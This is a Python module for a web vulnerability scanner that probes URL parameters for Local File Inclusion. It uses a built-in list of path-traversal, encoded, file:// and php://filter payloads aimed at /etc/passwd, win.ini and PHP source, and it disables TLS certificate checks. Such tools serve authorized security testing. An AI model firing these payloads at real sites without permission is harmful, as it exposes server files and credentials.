import requests
import logging
from urllib.parse import urlparse, urlencode, parse_qs, urlunparse

logger = logging.getLogger(__name__)

class SyncLFIScanner:
    def __init__(self, add_finding_callback, global_headers=None, global_cookies=None):
        self.add_finding_callback = add_finding_callback
        self.global_headers = global_headers if global_headers else {}
        self.global_cookies = global_cookies if global_cookies else {}

    def scan(self, base_url, payloads=None, test_params=None):
        """
        Performs basic synchronous Local File Inclusion (LFI) checks.
        :param base_url: The base URL to test. Can include query parameters.
        :param payloads: List of LFI payloads (file paths).
        :param test_params: List of parameter names to inject into.
        """
        if payloads is None:
            payloads = [
                "../../../../../../../../../../../../etc/passwd",
                "../../../../../../../../../../../../windows/win.ini",
                "....//....//....//....//etc/passwd", # Non-standard traversal
                "%252e%252e%252fetc%252fpasswd", # URL encoded
                "C:\\boot.ini", # Windows specific
                "/etc/hosts",
                "file:///etc/passwd", # Using file URI scheme
                "php://filter/convert.base64-encode/resource=index.php" # PHP filter LFI
            ]
        if test_params is None:
            test_params = ["file", "page", "include", "document", "path", "load", "name", "pg", "item", "view", "cat"]

        logger.info(f"[*] (SyncLFIScanner) Starting Basic LFI check on: {base_url}")

        parsed_url = urlparse(base_url)
        original_query_dict = parse_qs(parsed_url.query, keep_blank_values=True)

        # Scenario 1: Test existing parameters
        if original_query_dict:
            for param_name in original_query_dict.keys():
                for payload in payloads:
                    current_params_dict = {k: v[:] for k, v in original_query_dict.items()}
                    current_params_dict[param_name] = [payload] # Replace original value with payload

                    new_query_string = urlencode(current_params_dict, doseq=True)
                    vuln_url = urlunparse(parsed_url._replace(query=new_query_string))
                    self._perform_lfi_request(vuln_url, payload, param_name, "existing parameter")

        # Scenario 2: Test common parameters by appending them
        base_url_no_query = urlunparse(parsed_url._replace(query=''))
        for param_name in test_params:
            if param_name not in original_query_dict: # Only if not already tested
                for payload in payloads:
                    current_params_dict = {k: v[:] for k, v in original_query_dict.items()}
                    current_params_dict[param_name] = [payload]

                    new_query_string = urlencode(current_params_dict, doseq=True)
                    vuln_url = urlunparse(parsed_url._replace(query=new_query_string))
                    self._perform_lfi_request(vuln_url, payload, param_name, "common parameter")

        logger.info(f"(SyncLFIScanner) Basic LFI check completed for {base_url}")

    def _perform_lfi_request(self, vuln_url, payload, param_name, test_type):
        try:
            response = requests.get(
                vuln_url,
                headers=self.global_headers,
                cookies=self.global_cookies,
                timeout=10,
                verify=False,
                allow_redirects=True
            )
            response_text = response.text

            # Indicators of successful LFI
            # More specific and less FP-prone indicators are better.
            lfi_success_indicators = [
                "root:x:0:0", "[boot loader]", "default=", "[fonts]", # /etc/passwd, boot.ini, win.ini
                "daemon:", "mail.example.com", # /etc/passwd, /etc/hosts
                "PD9waHAg", "PD9waHAgc" # Common Base64 encodings of "<?php" or "<?php " from php://filter
            ]
            # Content that should NOT be present for common web pages, but IS for /etc/passwd
            sensitive_content_present = any(indicator in response_text for indicator in lfi_success_indicators)

            # Content that IS typical for web pages but NOT for raw /etc/passwd or similar files
            typical_web_content_absent = not ("<html" in response_text.lower() or "<body" in response_text.lower() or "<div" in response_text.lower())

            if sensitive_content_present and typical_web_content_absent :
                self.add_finding_callback(
                    "LFI (Basic)",
                    vuln_url,
                    f"Payload: '{payload}' in param '{param_name}' (tested as {test_type}) may have revealed sensitive file content.",
                    severity="High"
                )
            # Special check for PHP filter base64 encoded output
            elif "PD9waH" in response_text and len(response_text) > 200 and "php://filter" in payload : # PD9waH is <?ph
                 self.add_finding_callback(
                    "LFI (PHP Filter - Potential)",
                    vuln_url,
                    f"Payload: '{payload}' in param '{param_name}' (tested as {test_type}) returned base64 encoded data. Decode manually.",
                    severity="High"
                )
            else:
                logger.info(f"[-] (SyncLFIScanner) No obvious LFI at: {vuln_url} with payload '{payload}' on param '{param_name}'.")

        except requests.exceptions.RequestException as e:
            logger.error(f"(SyncLFIScanner) Error during basic LFI check for {vuln_url}: {e}")
        except Exception as e:
            logger.error(f"(SyncLFIScanner) Unexpected error during basic LFI check for {vuln_url}: {e}")

# Example usage:
if __name__ == '__main__':
    logging.basicConfig(level=logging.INFO)

    def example_add_finding(vulnerability_type, url, details, severity):
        print(f"[+] FOUND: {vulnerability_type} at {url} - {details} ({severity})")

    scanner = SyncLFIScanner(add_finding_callback=example_add_finding)
    # Test with a known vulnerable URL
    # scanner.scan("http://testphp.vulnweb.com/showimage.php?file=../../../../../etc/passwd") # Fictitious
    # scanner.scan("http://localhost/dvwa/vulnerabilities/fi/?page=../../../../etc/passwd")
    # scanner.scan("http://testphp.vulnweb.com/search.php?test=query") # Test non-vulnerable
    logger.info("LFI scanner module example run finished.")
    pass
